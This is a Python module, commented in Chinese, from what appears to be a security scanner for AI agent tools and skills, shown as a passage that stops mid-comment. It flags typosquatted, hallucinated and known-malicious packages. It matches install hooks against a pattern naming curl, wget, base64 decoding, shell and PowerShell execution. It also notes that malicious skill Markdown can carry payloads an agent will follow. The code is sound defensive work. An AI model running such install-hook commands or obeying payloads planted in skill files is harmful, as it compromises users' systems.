# scripts/tech_radar.py 每日扫描 AI Agent 生态的新攻击手法，起草规则候选到
# scanner/_proposed/；scripts/promote_rule.py 校验（正则可编译 + 良性语料零
# 误报 + 去重）后写入 data/radar_rules.json，在此载入合并。
#
# 刻意与 generated_rules.json 分开存放：后者由 intel_to_rules.py 整体重写，
# 混在一起会让雷达晋升的规则在下一次情报刷新时被静默抹掉。
RADAR_RULES = {}
_RADAR_META = {}
_RADAR_QUARANTINE = {}
# 已并入 ALL_RULES 的雷达规则键，重载时据此撤下上一轮（理由同
# _GENERATED_IN_ALL_RULES：只追加不撤除会让 breakdown 永久不自洽）。
_RADAR_IN_ALL_RULES = set()

# 雷达规则的字段契约。data/radar_rules.json 是机器生成的数据，不是手写常量，
# 所以它的字段必须在**载入时**校验，不能等第一次扫描才暴露。
#
# 旧实现是 `try: desc, severity = meta[0], meta[1] except: continue`—
# 结构不对就静默丢弃，坏条目从此消失在日志之外（假绿）。而且 severity
# 完全不校验、正则也完全不在加载期编译：一条坏正则会等到扫描时才 re.error，
# 把整次扫描打崩。借鉴 CosmosMind RSIH Genome 的「互斥字段所有权 + 越界写
# 加载期即失败」：越界的条目在加载期就被拒收并可见地报告，而不是在运行期
# 炸掉或被无声吞掉。
_RADAR_VALID_SEVERITIES = {"critical", "high", "medium", "low", "info"}


def _validate_radar_entry(pattern, meta):
    """校验单条雷达规则。返回问题列表；空列表 = 通过字段契约。

    刻意不抛异常：本函数只在模块 import 时被调用，任何异常都会让扫描器
    整体不可用。不确定一律记为问题，由调用方隔离该条目。
    """
    problems = []
    if not isinstance(pattern, str) or not pattern.strip():
        problems.append("pattern key 为空或非字符串")
        return problems
    if not isinstance(meta, (list, tuple)) or len(meta) != 2:
        problems.append("value 必须是长度为 2 的 [描述, 严重级别]")
        return problems

    desc, severity = meta[0], meta[1]
    if not isinstance(desc, str) or not desc.strip():
        problems.append("description 为空或非字符串")
    elif desc.strip().upper().startswith("TODO"):
        problems.append("description 仍是 TODO 占位符")

    if not isinstance(severity, str):
        problems.append("severity 非字符串")
    elif severity.strip().lower() not in _RADAR_VALID_SEVERITIES:
        problems.append("severity %r 不在 %s" % (severity,
                                                sorted(_RADAR_VALID_SEVERITIES)))

    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error as e:
        problems.append("正则无法编译: %s" % e)
        return problems  # 不确定的正则不再往下判，避免二次异常
    if compiled.search("") or compiled.search("a"):
        problems.append("正则可匹配空串或平凡输入，过宽")
    return problems


def _load_radar_rules():
    """载入 data/radar_rules.json 并执行字段契约。

    文件缺失或整体损坏时静默降级（基础规则不受影响）；**条目级**问题
    不再静默丢弃，而是隔离进 _RADAR_QUARANTINE，可通过
    get_radar_load_warnings() 读取。绝不抛异常—加载期失败的正确答案
    是「少一条规则 + 一条可见告警」，而不是整个扫描器 import 失败。
    """
    global RADAR_RULES, _RADAR_META, _RADAR_QUARANTINE, _RADAR_IN_ALL_RULES
    import json as _json
    import os as _os

    _RADAR_QUARANTINE = {}
    path = _os.path.join(
        _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
        "data", "radar_rules.json",
    )
    if not _os.path.exists(path):
        return
    try:
        with open(path, encoding="utf-8") as f:
            data = _json.load(f)
    except Exception:
        return
    if not isinstance(data, dict):
        return

    for pattern, meta in (data.get("rules") or {}).items():
        problems = _validate_radar_entry(pattern, meta)
        if problems:
            key = pattern if isinstance(pattern, str) and pattern.strip() \
                else repr(pattern)
            _RADAR_QUARANTINE[key] = problems
            continue
        RADAR_RULES[pattern] = (f"[雷达] {meta[0]}", meta[1].strip().lower())

    _RADAR_META = {
        "total_rules": len(RADAR_RULES),
        "provenance": data.get("provenance", {}),
        "quarantined": len(_RADAR_QUARANTINE),
    }

    # 重载语义：撤下上一轮并入 ALL_RULES 的键，再并入本轮。
    # 此前这行 update 只写在模块顶层，import 之后任何一次
    # _load_radar_rules()（测试隔离、promote 后热重载）都只改 RADAR_RULES、
    # 不碰 ALL_RULES —— get_rule_breakdown() 随即报出
    # 「208 + 9 + 19 = 236 却 total = 235」这种自相矛盾的数字，
    # 而 rules_breakdown 正是部署校验的判据之一。
    for _k in _RADAR_IN_ALL_RULES:
        ALL_RULES.pop(_k, None)
    ALL_RULES.update(RADAR_RULES)
    _RADAR_IN_ALL_RULES = set(RADAR_RULES)


_load_radar_rules()


def get_radar_rules_meta():
    """返回雷达晋升规则的元信息（含每条规则的情报溯源）。"""
    return dict(_RADAR_META)


def get_radar_load_warnings():
    """返回加载期被字段契约拒收的雷达条目 {pattern: [原因, ...]}。

    空 dict = 数据文件干净。非空必须被 CI / self_scan 看见：静默丢弃
    坏条目是本仓库明确的反模式（假绿）—一条被吞的规则等于一条不存在的
    规则，而报告里不会体现任何差异。
    """
    return {k: list(v) for k, v in _RADAR_QUARANTINE.items()}


# 危险npm包（已知恶意）
DANGEROUS_NPM_PACKAGES = {
    "event-stream", "flatmap-stream", "ddos", "koa-session",
    "crossenv", "babel-cli-fake", "node-serialize",
}

# 危险PyPI包
DANGEROUS_PYPI_PACKAGES = {
    "pickle", "subprocess32",
}

# 由权威漏洞情报自动扩充的高危包名单（随情报库同步增长）
for _key, _entry in GENERATED_PACKAGE_BLACKLIST.items():
    _eco = (_entry.get("ecosystem") or "").lower()
    _name = _entry.get("package")
    if not _name:
        continue
    if _eco in ("npm", "node"):
        DANGEROUS_NPM_PACKAGES.add(_name)
    elif _eco in ("pypi", "pip", "python"):
        DANGEROUS_PYPI_PACKAGES.add(_name)

# ============================================================
# 离线「幻觉包 / 投毒依赖」检测（typosquat + 仿冒 + 形近字符）
# 对标 agent-security-scanner-mcp 的 hallucination-package detection。
# 纯本地、零依赖、不联网；联网校验作为可选远程项（见 engine 的 LLM 供应链分析）。
# ============================================================

# 可信包名录（常见 npm / PyPI 官方包，用于编辑距离比对 + 跨注册表混淆判定）
NPM_PACKAGE_CATALOG = {
    "express", "lodash", "react", "react-dom", "vue", "axios", "request",
    "chalk", "commander", "fs-extra", "dotenv", "jsonwebtoken", "bcrypt",
    "webpack", "babel", "eslint", "prettier", "mongoose", "sequelize",
    "socket.io", "moment", "underscore", "async", "body-parser", "cors",
    "node-fetch", "express-validator", "helmet", "passport", "socketio",
    "typescript", "tslib", "rimraf", "glob", "minimist", "yargs", "debug",
    "chai", "mocha", "jest", "npm", "yarn", "pnpm", "@modelcontextprotocol/sdk",
    # 高频合法复合名（避免复合式幻觉启发式误报）
    "react-router", "react-router-dom", "react-redux", "react-scripts",
    "react-native", "react-hook-form", "react-query", "react-codemod",
    "jscodeshift", "vue-router", "styled-components", "date-fns",
    "cross-env", "ts-node", "ts-jest", "eslint-config-prettier",
    "eslint-plugin-react", "babel-loader", "css-loader", "style-loader",
    "html-webpack-plugin", "node-cron", "next", "nuxt", "vite", "rollup",
    "esbuild", "zod", "redux", "redux-thunk", "graphql", "apollo-server",
}

PYPI_PACKAGE_CATALOG = {
    "numpy", "pandas", "flask", "django", "requests", "sqlalchemy",
    "pytest", "setuptools", "click", "jinja2", "fastapi", "uvicorn",
    "scipy", "matplotlib", "scikit-learn", "tensorflow", "torch", "pytorch",
    "openai", "anthropic", "langchain", "pypdf", "pillow", "boto3",
    "pydantic", "httpx", "aiohttp", "beautifulsoup4", "lxml", "cryptography",
    "python-dotenv", "six", "certifi", "urllib3", "idna", "charset-normalizer",
    "rich", "typer", "structlog", "loguru", "mcp", "pymupdf",
    # 高频合法复合名
    "langchain-core", "langchain-community", "langchain-openai",
    "langchain-anthropic", "llama-index", "sentence-transformers",
    "huggingface-hub", "python-multipart", "python-dateutil", "types-requests",
    "google-cloud-storage", "azure-identity", "openai-agents", "mcp-server",
    "pytest-asyncio", "pytest-cov", "flask-cors", "flask-sqlalchemy",
    "django-rest-framework", "djangorestframework", "opentelemetry-api",
}

# 向后兼容：并集
LEGIT_PACKAGE_CATALOG = NPM_PACKAGE_CATALOG | PYPI_PACKAGE_CATALOG


def _levenshtein(a, b):
    """标准编辑距离（本地、零依赖）。"""
    if a == b:
        return 0
    la, lb = len(a), len(b)
    if la == 0:
        return lb
    if lb == 0:
        return la
    prev = list(range(lb + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cost = 0 if ca == cb else 1
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + cost))
        prev = cur
    return prev[lb]


# 形近字符归一化（防 homoglyph 投毒：0/o 1/l 3/e 5/s @/a）
_HOMOGLYPH_MAP = str.maketrans("01358@", "olzebo")


def _homoglyph_normalize(name):
    return name.translate(_HOMOGLYPH_MAP)


# 仿冒官方厂商包名的可疑销售词
_BRAND_ROOTS = {
    "openai", "anthropic", "claude", "mcp", "langchain", "aws", "google",
    "azure", "gpt", "modelcontextprotocol", "huggingface", "cohere", "ollama",
}
_IMPERSONATION_SOCIAL = (
    "official", "real", "true", "genuine", "safe", "secure", "security",
    "wrapper", "proxy", "apikey", "api-key", "sdk", "client", "auth",
)


def _entropy(s):
    """简单香农熵，用于判断包名尾部是否为随机串。"""
    if not s:
        return 0.0
    from collections import Counter
    import math
    cnt = Counter(s)
    return -sum((c / len(s)) * math.log2(c / len(s)) for c in cnt.values())


# ------------------------------------------------------------------
# Slopsquatting（AI 幻觉包）离线启发式
# 背景：USENIX Security 2025 —— 16 个模型 / 57.6 万代码样本中 19.7% 推荐的包不存在，
# 共 205,474 个唯一虚构包名；43~58% 的幻觉名可复现。关键点是**约一半幻觉名与任何
# 真实包都不形近**，编辑距离/相似度检测天然失效（典型案例 react-codeshift，
# 2026-01 经 AI 生成的 skill 文件扩散到 237 个仓库）。
# 因此这里补一条「复合式幻觉包」通道：以生态锚点词 + 未收录 + 复合结构为特征，
# 输出 **advisory（info 级，不扣分）**，提示人工/远程核实注册表存在性。
# 纯离线，不联网；联网存在性校验属可选远程项。
# ------------------------------------------------------------------

# 生态锚点词：出现即说明该名字自称属于某知名生态
_ECOSYSTEM_ANCHORS = {
    "react", "vue", "angular", "svelte", "next", "nuxt", "node", "npm",
    "webpack", "babel", "eslint", "jest", "express", "redux", "graphql",
    "langchain", "llamaindex", "openai", "anthropic", "claude", "gpt",
    "mcp", "modelcontextprotocol", "huggingface", "transformers", "torch",
    "tensorflow", "pandas", "numpy", "django", "flask", "fastapi", "pytest",
    "aws", "azure", "gcp", "google", "cloudflare", "supabase", "stripe",
    "agent", "agents", "ollama", "cohere", "gemini", "copilot",
}

# 内部命名空间词（dependency confusion / 命名空间劫持信号）
_INTERNAL_NAMESPACE_HINTS = {
    "internal", "private", "corp", "corporate", "intranet", "inhouse",
    "in-house", "confidential", "staging", "prod-only", "companyname",
    "acme", "sandbox-internal",
}


def _split_tokens(name):
    return [t for t in re.split(r"[-_.@/]+", name) if t]


def check_package_name(name, ecosystem="npm"):
    """
    离线检测单个依赖名是否为幻觉包 / typosquat / 仿冒包。
    返回 findings 列表（每项含 type/severity/description/owasp_category/evidence）。
    纯本地启发式，不联网。
    """
    findings = []
    if not name or not isinstance(name, str):
        return findings
    n = name.strip().lower()
    # 去掉 npm scope 前缀（如 @scope/name -> name）
    if n.startswith("@") and "/" in n:
        n = n.split("/", 1)[1]
    if not n:
        return findings
    _is_npm = ecosystem in ("npm", "node")
    _is_py = ecosystem in ("pypi", "pip", "python")
    # 已知恶意包由 dependency_analysis 处理，这里不重复
    if _is_npm and n in DANGEROUS_NPM_PACKAGES:
        return findings
    if _is_py and n in DANGEROUS_PYPI_PACKAGES:
        return findings

    # 0) 跨注册表混淆（研究：8.7% 的 Python 幻觉包名在 npm 上真实存在）
    #    必须先于「可信名录」早退判定，否则会被并集名录吞掉。
    if _is_py and n in NPM_PACKAGE_CATALOG and n not in PYPI_PACKAGE_CATALOG:
        findings.append({
            "type": "cross_registry_confusion",
            "severity": "medium",
            "description": f"跨注册表混淆: '{name}' 是 npm 生态包名，却出现在 Python 依赖中",
            "owasp_category": "MCP04",
            "evidence": f"{name} (npm-only name in pypi manifest)",
            "remediation": "确认生态归属；对 agent 生成的依赖强制 registry 白名单",
        })
        return findings
    if _is_npm and n in PYPI_PACKAGE_CATALOG and n not in NPM_PACKAGE_CATALOG:
        findings.append({
            "type": "cross_registry_confusion",
            "severity": "medium",
            "description": f"跨注册表混淆: '{name}' 是 PyPI 生态包名，却出现在 npm 依赖中",
            "owasp_category": "MCP04",
            "evidence": f"{name} (pypi-only name in npm manifest)",
            "remediation": "确认生态归属；对 agent 生成的依赖强制 registry 白名单",
        })
        return findings

    if n in LEGIT_PACKAGE_CATALOG:
        return findings

    # 1) 编辑距离 typosquat
    best, best_d = None, 99
    for legit in LEGIT_PACKAGE_CATALOG:
        if abs(len(legit) - len(n)) > 3:
            continue
        d = _levenshtein(n, legit)
        if d < best_d:
            best_d, best = d, legit
    if best is not None:
        if best_d == 1 or (best_d == 2 and len(n) >= 8):
            findings.append({
                "type": "typosquatting",
                "severity": "high",
                "description": f"可能的 typosquatting 包名: '{name}' 形近官方包 '{best}'",
                "owasp_category": "MCP04",
                "evidence": f"{name} ~ {best} (dist={best_d})",
            })
            return findings

    # 2) 形近字符（homoglyph）
    norm = _homoglyph_normalize(n)
    if norm in LEGIT_PACKAGE_CATALOG and norm != n:
        findings.append({
            "type": "typosquatting",
            "severity": "high",
            "description": f"形近字符(homoglyph)投毒: '{name}' 归一后为官方包 '{norm}'",
            "owasp_category": "MCP04",
            "evidence": f"{name} -> {norm}",
        })
        return findings

    # 3) 厂商名仿冒（仅当尾部含可疑销售词或高熵随机串时告警，降低误报）
    root = n.split("-")[0].split("_")[0].split(".")[0]
    if root in _BRAND_ROOTS and n != root:
        tail = n[len(root):].lstrip("-_.")
        # 熵启发式只对「单段无分隔」的尾部生效，避免 langchain-mcp-toolkit 这类
        # 语义化复合名被误判为品牌仿冒（它们应走幻觉包 advisory 通道）。
        _tail_is_single_token = not any(sep in tail for sep in "-_.")
        if any(w in tail for w in _IMPERSONATION_SOCIAL) or (
            _tail_is_single_token and len(tail) >= 6 and _entropy(tail) > 3.0
        ):
            findings.append({
                "type": "brand_impersonation",
                "severity": "medium",
                "description": f"疑似仿冒官方厂商包名: '{name}' 借用 '{root}' 品牌",
                "owasp_category": "MCP04",
                "evidence": f"{name} (root={root})",
            })
            return findings

    tokens = _split_tokens(n)

    # 4) 依赖混淆 / 内部命名空间外泄（内部包名出现在公共 manifest 中）
    if any(t in _INTERNAL_NAMESPACE_HINTS for t in tokens):
        findings.append({
            "type": "dependency_confusion",
            "severity": "medium",
            "description": f"依赖混淆风险: '{name}' 含内部命名空间标识，公共注册表可被抢注同名包",
            "owasp_category": "MCP04",
            "evidence": f"{name} (internal token)",
            "remediation": "为内部包配置私有 registry scope 并锁定解析顺序",
        })
        return findings

    # 5) 复合式幻觉包（slopsquatting）—— 与真实包不形近，编辑距离检测失效的那一半
    #    特征：≥2 段的复合名 + 至少一个生态锚点词 + 不在可信名录内。
    #    严重度 info（不扣分），仅作「请核实注册表存在性」的 advisory。
    if 2 <= len(tokens) <= 5 and all(t.isalnum() for t in tokens):
        anchors = [t for t in tokens if t in _ECOSYSTEM_ANCHORS]
        if anchors:
            findings.append({
                "type": "suspected_hallucinated_package",
                "severity": "info",
                "description": (
                    f"疑似 AI 幻觉包(slopsquatting): '{name}' 借用 '{anchors[0]}' 生态命名但不在可信名录，"
                    f"需核实其在注册表中真实存在"
                ),
                "owasp_category": "MCP04",
                "evidence": f"{name} (anchor={anchors[0]}, composite)",
                "remediation": "安装前校验注册表存在性/包龄/下载量；使用 lockfile 与依赖白名单",
            })

    return findings


# ------------------------------------------------------------------
# 依赖卫生检查（manifest 级，离线）
# 覆盖：安装脚本投毒、不可信来源直装、版本未锁定、缺 lockfile。
# ------------------------------------------------------------------

_INSTALL_HOOK_KEYS = ("preinstall", "install", "postinstall", "prepare")
_INSTALL_HOOK_DANGER = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|base64\s+-d|chmod\s+\+x|bash\s+-c|sh\s+-c|"
    r"node\s+-e|python\s+-c|powershell|certutil|eval)\b",
    re.IGNORECASE,
)
_UNTRUSTED_SPEC = re.compile(
    r"^(git\+|git:|github:|gitlab:|bitbucket:|http://|file:|link:)", re.IGNORECASE
)
_UNPINNED_SPEC = {"*", "", "latest", "x", "*.*", "next"}


def check_dependency_hygiene(files):
    """
    manifest 级依赖卫生检查（纯离线）。
    files: {filename: content}
    返回 findings 列表。
    """
    findings = []
    if not isinstance(files, dict):
        return findings

    lowered = {k.lower().replace("\\", "/").split("/")[-1] for k in files}
    has_npm_lock = bool(
        lowered & {"package-lock.json", "yarn.lock", "pnpm-lock.yaml", "npm-shrinkwrap.json"}
    )

    for fname, content in files.items():
        base = fname.lower().replace("\\", "/").split("/")[-1]
        if not isinstance(content, str):
            continue

        if base == "package.json":
            try:
                pkg = json.loads(content)
            except Exception:
                continue
            if not isinstance(pkg, dict):
                continue

            # a) 安装脚本投毒
            scripts = pkg.get("scripts") or {}
            if isinstance(scripts, dict):
                for hook in _INSTALL_HOOK_KEYS:
                    cmd = scripts.get(hook)
                    if isinstance(cmd, str) and _INSTALL_HOOK_DANGER.search(cmd):
                        findings.append({
                            "type": "install_script_execution",
                            "severity": "critical",
                            "description": f"安装期脚本执行高危命令: scripts.{hook}",
                            "file": fname,
                            "owasp_category": "MCP04",
                            "evidence": cmd[:160],
                            "remediation": "使用 --ignore-scripts 安装并人工审计该 hook",
                        })

            # b) 依赖来源与版本锁定
            declared = 0
            for dep_type in ("dependencies", "devDependencies", "optionalDependencies"):
                deps = pkg.get(dep_type) or {}
                if not isinstance(deps, dict):
                    continue
                for dname, spec in deps.items():
                    declared += 1
                    spec_s = spec if isinstance(spec, str) else ""
                    if _UNTRUSTED_SPEC.match(spec_s.strip()):
                        findings.append({
                            "type": "untrusted_dependency_source",
                            "severity": "high",
                            "description": f"依赖 '{dname}' 从非注册表来源安装: {spec_s[:60]}",
                            "file": fname,
                            "owasp_category": "MCP04",
                            "evidence": f"{dname}: {spec_s[:80]}",
                            "remediation": "改用已发布的注册表版本并锁定完整性哈希",
                        })
                    elif spec_s.strip().lower() in _UNPINNED_SPEC:
                        findings.append({
                            "type": "unpinned_dependency",
                            "severity": "medium",
                            "description": f"依赖 '{dname}' 未锁定版本({spec_s or '空'})，存在供应链漂移/rug-pull 风险",
                            "file": fname,
                            "owasp_category": "MCP04",
                            "evidence": f"{dname}: {spec_s}",
                            "remediation": "锁定精确版本并提交 lockfile",
                        })

            if declared and not has_npm_lock:
                findings.append({
                    "type": "missing_lockfile",
                    "severity": "low",
                    "description": "声明了依赖但未见 lockfile，幻觉包/漂移无法 fail-closed",
                    "file": fname,
                    "owasp_category": "MCP04",
                    "evidence": f"{declared} deps, no package-lock.json/yarn.lock/pnpm-lock.yaml",
                    "remediation": "提交 lockfile 并在 CI 使用 npm ci",
                })

        elif base == "requirements.txt":
            for raw in content.split("\n"):
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if line.startswith("-e ") or line.startswith("--editable"):
                    target = line.split(None, 1)[1] if " " in line else ""
                    if target.startswith(("git+", "http://", "https://")):
                        findings.append({
                            "type": "untrusted_dependency_source",
                            "severity": "high",
                            "description": f"可编辑依赖来自非 PyPI 来源: {target[:60]}",
                            "file": fname,
                            "owasp_category": "MCP04",
                            "evidence": line[:120],
                            "remediation": "改用 PyPI 发布版本并锁定哈希",
                        })
                    continue
                if line.startswith(("git+", "http://")):
                    findings.append({
                        "type": "untrusted_dependency_source",
                        "severity": "high",
                        "description": f"依赖从非 PyPI/明文 HTTP 来源安装: {line[:60]}",
                        "file": fname,
                        "owasp_category": "MCP04",
                        "evidence": line[:120],
                        "remediation": "改用 HTTPS 的 PyPI 发布版本并锁定哈希",
                    })
                elif "--index-url" in line or "--extra-index-url" in line:
                    findings.append({
                        "type": "dependency_confusion",
                        "severity": "medium",
                        "description": "requirements 指定了额外索引源，存在依赖混淆解析风险",
                        "file": fname,
                        "owasp_category": "MCP04",
                        "evidence": line[:120],
                        "remediation": "固定单一索引源或使用 --index-url 替代 --extra-index-url",
                    })

    return findings

# 跳过的文件（非代码）
SKIP_EXTENSIONS = {'.ini', '.cfg', '.env', '.lock', '.log', '.svg', '.png', '.jpg'}
SKIP_NAMES = {'registry.yaml', 'registry.yml', 'tox.ini', '.gitignore', 'LICENSE', 'Makefile'}

# ---------------------------------------------------------------------------
# 指令性 Markdown：agent 会照着执行的载荷，不能按「文档示例」降级
#
# 背景：早期把所有 .md 一律降级（README 里的 curl 示例不该报 critical）。
# 但 agent skill 生态里，SKILL.md 本身就是可执行体——LLM 读到什么就做什么。
# 一个恶意 skill 只要把 payload 写进 Markdown 正文，就能拿到「low + 高分」放行。
# 因此区分两类 Markdown：给人看的文档 vs 给 agent 执行的指令。
# ---------------------------------------------------------------------------
AGENT_INSTRUCTION_FILENAMES = {
    'skill.md', 'agents.md', 'agent.md', 'claude.md', 'soul.md',
    'system.md', 'prompt.md', 'prompts.md', 'instructions.md',
}
AGENT_INSTRUCTION_DIR_HINTS = ('/skills/', '/.claude/', '/prompts/', '/agents/')


def is_agent_instruction_doc(filepath, content):
    """这份 Markdown 是不是 agent 会当指令执行的载荷？

    命中任一即判定为指令载荷（不降级）：
      1. 文件名属于公认的 agent 指令文件（SKILL.md / AGENTS.md / CLAUDE.md ...）
      2. 路径落在 skills / prompts / agents / .claude 目录下的 .md
      3. 带 YAML frontmatter 且同时含 name 与 description（Anthropic Skill 规范）
    """
    path_l = (filepath or '').replace('\\', '/').lower()
    if not (path_l.endswith('.md') or path_l.endswith('.markdown')):
        return False

    base = path_l.split('/')[-1]
    if base in AGENT_INSTRUCTION_FILENAMES:
        return True

    probe = '/' + path_l
    if any(hint in probe for hint in AGENT_INSTRUCTION_DIR_HINTS):
        return True

    text = content or ''
    if text.startswith('---'):
        end = text.find('\n---', 3)
        if end != -1:
            fm = text[3:end]
            if re.search(r'^\s*name\s*:', fm, re.M) and re.search(r'^\s*description\s*:', fm, re.M):
                return True
    return False


def get_all_rules(tool_type="mcp"):
    """获取适用于指定工具类型的所有规则"""
    rules = dict(ALL_RULES)
    if tool_type in ("skill", "gpt", "prompt"):
        rules.update(SKILL_EXTRA_RULES)
    return rules


def get_rule_count(tool_type="mcp"):
    """获取规则数量"""
    return len(get_all_rules(tool_type))


def get_rule_breakdown():
    """规则的构成明细：静态规则 / 情报驱动 / 雷达晋升。

    为什么需要这个：`get_rule_count()` 只给一个总数，一旦线上与本地对不上
    （例如线上 215、本地 238），只能靠猜是哪一环出了问题。拆开之后立刻可见：
    静态规则数应当是常量（只随发版变），动态规则数随数据飞轮变化——
    两者不同步时，问题必然出在 data/generated_rules.json / data/radar_rules.json
    的部署上，而不是扫描器代码。
    """
    return {
        "static": _STATIC_RULE_COUNT,
        "generated": len(GENERATED_RULES),
        "radar": len(RADAR_RULES),
        "total": len(ALL_RULES),
    }


def get_owasp_category_rules(category):
    """获取指定OWASP类别的规则数量"""
    mapping = {
        "MCP01": MCP01_RULES, "MCP02": MCP02_RULES, "MCP03": MCP03_RULES,
        "MCP04": MCP04_RULES, "MCP05": MCP05_RULES, "MCP06": MCP06_RULES,
        "MCP07": MCP07_RULES, "MCP08": MCP08_RULES, "MCP09": MCP09_RULES,
        "MCP10": MCP10_RULES,
        "ASI01": ASI01_RULES, "ASI02": ASI02_RULES, "ASI03": ASI03_RULES,
        "ASI04": ASI04_RULES, "ASI05": ASI05_RULES, "ASI06": ASI06_RULES,
        "ASI07": ASI07_RULES, "ASI08": ASI08_RULES, "ASI09": ASI09_RULES,
        "ASI10": ASI10_RULES, "SANDBOX": SANDBOX_RULES,
    }
    return len(mapping.get(category, {}))


def get_owasp_coverage(findings):
    """计算OWASP MCP Top 10覆盖情况"""
    covered = set()
    for f in findings:
        cat = f.get("owasp_category")
        if cat and cat.startswith("MCP"):
            covered.add(cat)
    categories_detail = {}
    for cat in covered:
        info = OWASP_MCP_TOP10.get(cat, {})
        categories_detail[cat] = {
            "name": info.get("name", cat),
            "name_cn": info.get("name_cn", cat),
            "rules_triggered": len([f for f in findings if f.get("owasp_category") == cat]),
            "total_rules": get_owasp_category_rules(cat),
        }
    return {
        "covered": sorted(covered),
        "covered_count": len(covered),
        "total": 10,
        "coverage_percent": len(covered) * 10,
        "categories": categories_detail,
    }


def get_agentic_coverage(findings):
    """计算OWASP Agentic AI Top 10 (ASI01-ASI10) 覆盖情况"""
    covered = set()
    for f in findings:
        cat = f.get("owasp_category")
        if cat and cat.startswith("ASI"):
            covered.add(cat)
    categories_detail = {}
    for cat in covered:
        info = OWASP_AGENTIC_AI_TOP10.get(cat, {})
        categories_detail[cat] = {
            "name": info.get("name", cat),
            "name_cn": info.get("name_cn", cat),
            "rules_triggered": len([f for f in findings if f.get("owasp_category") == cat]),
            "total_rules": get_owasp_category_rules(cat),
        }
    return {
        "covered": sorted(covered),
        "covered_count": len(covered),
        "total": 10,
        "coverage_percent": len(covered) * 10,
        "categories": categories_detail,
    }


# ============================================================
# 精确锚点：per-finding 修复建议 + 稳定 rule_id
# ============================================================
# 背景：静态规则产出的 finding 长期只有 type=“dangerous_pattern” 这一个标签，
# 用户拿到「命令执行」却不知道该换掉 exec() 还是改参数化调用；description 是
# 「说了什么」，remediation 才是「怎么改」，两者不能互相替代。全局
# recommendations 只有几条笼统话术，无法对应到具体那一条 finding。
#
# 做法：不在 210 条规则里逐条手写修复文案（维护成本不划算、且会和规则正文脱节），
# 而是按「规则正则里出现的关键 token」解析出最贴切的修复动作，再按 OWASP 类别
# 兜底。token 表按「越具体越靠前」排序 —— 先匹配到具体动作就不再看类别兜底。
#
# rule_id 必须稳定：用户拿它去查规则库/提 issue/做去重。已知类别的静态规则用
# 「类别-序号」（dict 插入序在 Python 3.7+ 稳定）；动态规则与未归类规则用
# 正则串的哈希前缀，保证不随 JSON 加载顺序漂移。
# ============================================================

_REMEDIATION_CATEGORY = {
    "MCP01": "把敏感信息移出代码仓库，改用环境变量或密钥管理服务注入；已泄露的凭据必须在服务商控制台吊销并轮换，仅从代码里删除是不够的",
    "MCP02": "把权限声明收紧到实际需要的最小集合，移除通配符、all 与全量访问，并按操作拆分独立权限",
    "MCP03": "审查工具描述与文档正文，清除零宽字符/注释/Unicode 转义中夹带的隐藏指令；描述与代码行为必须一致",
    "MCP04": "锁定依赖精确版本并提交 lockfile，安装前校验包的存在性/包龄/下载量，禁用不可信的安装脚本",
    "MCP05": "不要执行拼接自用户输入的命令，改用参数化调用或白名单命令；对必须执行的外部进程收敛可执行范围",
    "MCP06": "把外部内容当作不可信输入处理，注入模型前先做指令隔离与长度限制，并对输出做二次校验",
    "MCP07": "为服务端点加上认证与最小授权，区分只读与写操作权限，拒绝匿名访问敏感接口",
    "MCP08": "补齐结构化日志与审计事件，记录关键操作的主体/动作/结果，并接入异常告警",
    "MCP09": "清点并登记所有运行的 MCP 服务端点，纳入统一的接入审批与生命周期管理",
    "MCP10": "按最小必要原则裁剪传递给外部工具的上下文，脱敏后再外发，并明确数据流向",
}
_REMEDIATION_ASI = {
    "ASI01": "收敛外部内容的注入面，对工具返回值与检索结果做标记与边界隔离",
    "ASI02": "对工具与技能做来源校验与完整性签名，禁止从不可信源自动加载",
    "ASI03": "在委派与子代理边界上重放权限校验，禁止子代理隐式继承父级全部权限",
    "ASI04": "为记忆与上下文持久化做访问控制与过期清理，防止跨会话泄露",
    "ASI05": "对多代理协作的通信做身份认证与内容审计，阻断代理间的欺骗路径",
    "ASI06": "对自主决策加预算与审批闸门，禁止无界自循环与无上限资源消耗",
    "ASI07": "隔离每个代理的可写范围，禁止跨会话共享可执行上下文",
    "ASI08": "提供可终止的运行时开关，允许外部强制中止失控的代理行为",
    "ASI09": "为代理行为保留完整可追溯的执行轨迹，支持事后审计与复现",
    "ASI10": "对代理对外部系统的写操作加白名单与速率限制，禁止未审批的对外变更",
}

# token -> 具体修复动作。顺序敏感：越具体越靠前。
#
# 匹配对象是「规则正则源码」而不是命中文本 —— 规则本身就知道它检测的是什么。
# 但正则源码里满是反斜杠转义（`os\.system`、`\[=:\]`、`\s*`），直接拿它当正则再匹配一次
# 必然转义错位（曾把 `[=:]` 误写成 `\[?=:`，导致 API Key 规则掉到类别兜底文案）。
# 因此先剥掉所有反斜杠做归一化，再用纯子串匹配：确定、无转义歧义。
# 每条的 needles 是「任一命中即算」的候选列表。
_REMEDIATION_TOKENS = [
    (("private key",), "把私钥移出仓库，用环境变量或密钥管理服务承载，并用 BFG/force-push 从 git 历史中彻底清除"),
    (("mongodb", "postgres", "mysql", "redis", "mariadb"), "把数据库连接串（含明文密码）移入环境变量或密钥管理服务，并轮换该密码"),
    (("sk-ant",), "这是 Anthropic 密钥：立即在控制台吊销并轮换，再从代码与 git 历史中删除"),
    (("sk-",), "这是 OpenAI 密钥：立即在控制台吊销并轮换，再从代码与 git 历史中删除"),
    (("akia", "agpa", "aida", "aroa", "asias"), "这是 AWS Access Key：立即在 IAM 中禁用并轮换，检查 CloudTrail 是否已被使用"),
    (("ghp_", "gho_", "github_pat"), "这是 GitHub 令牌：到 Settings > Tokens 撤销并重发，收敛到最小 scope"),
    (("glpat-",), "这是 GitLab 令牌：到 Settings > Access Tokens 撤销并重发"),
    (("xox",), "这是 Slack 令牌/Webhook：到 Slack 管理后台撤销并重发"),
    (("apikey", "api_key"), "把 API Key 改为从环境变量读取，代码里只留变量名；已硬编码的值必须轮换"),
    (("password", "passwd", "pwd"), "移除硬编码密码，改用密钥管理服务或环境变量；已进过版本库的密码视为已泄露，必须轮换"),
    (("token", "bearer", "auth"), "把令牌改为运行时注入，禁止写入源码；已提交的令牌需在签发方撤销"),
    # 隐藏指令必须早于命令执行 token：投毒规则里同样含 exec/eval/system 字样，
